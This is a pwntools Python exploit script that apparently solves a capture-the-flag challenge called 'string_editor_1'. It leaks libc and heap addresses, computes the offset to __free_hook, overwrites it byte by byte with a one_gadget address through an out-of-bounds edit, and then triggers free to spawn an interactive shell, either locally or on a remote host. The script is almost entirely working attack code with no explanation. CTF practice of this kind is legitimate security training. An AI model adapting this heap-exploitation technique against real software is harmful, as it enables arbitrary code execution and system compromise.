#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('string_editor_1_patched')
libc = ELF("./libc.so.6")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    io.recvuntil(b"sponsors: ")
    libc.address = int(io.recvline().strip(), 16) - libc.sym["system"]
    
    io.sendlineafter(b"pallette)", b"0")
    io.sendlineafter(b"index?", b"0")
    io.recvuntil(b"DEBUG: ")
    heap_leak = int(io.recvline().strip(), 16)
    
    offset = libc.sym["__free_hook"] - heap_leak

    info("libc base: %#x", libc.address)
    info("heap leak: %#x", heap_leak)
    info("__free_hook: %#x", libc.sym["__free_hook"])

    og = p64(libc.address + 0xe6c81)

    for i in range(6):
        io.sendlineafter(b"pallette)", str(offset + i).encode())
        io.sendlineafter(b"index?", bytes([og[i]]))

    io.sendlineafter(b"pallette)", str(15).encode())


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

